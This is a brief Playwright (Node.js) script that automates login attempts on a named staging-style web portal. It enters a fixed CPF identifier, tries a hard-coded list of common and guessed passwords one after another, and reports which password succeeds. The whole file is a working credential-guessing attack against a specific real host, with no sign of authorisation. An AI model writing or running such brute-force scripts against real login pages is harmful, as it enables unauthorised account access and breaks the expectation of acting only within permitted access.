const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({ channel: 'chrome', headless: true });
  const page = await browser.newPage();
  
  const passwords = ['@Callcenter123', 'callcenter123', 'Callcenter123', '@callcenter123', 'Inema@2026', 'gestor123', '123456', 'Callcenter@123'];
  
  for (const pwd of passwords) {
    await page.goto('https://gla-inema-hml.acto.com.br/', { waitUntil: 'networkidle' });
    const inputCpf = page.locator('input[id*="cpf"], input[type="text"]').first();
    const inputSenha = page.locator('input[type="password"]').first();
    await inputCpf.fill('12345678901');
    await inputSenha.fill(pwd);
    await page.getByRole('button', { name: /entrar|acessar/i }).click();
    await page.waitForTimeout(2000);
    const url = page.url();
    const errorMsg = await page.locator('text=Credenciais incorretas').count();
    console.log(`Testando senha: ${pwd} -> URL: ${url} | Erro: ${errorMsg > 0}`);
    if (!url.endsWith('/login') && errorMsg === 0) {
      console.log('>>> SUCESSO COM A SENHA:', pwd);
      break;
    }
  }
  await browser.close();
})();
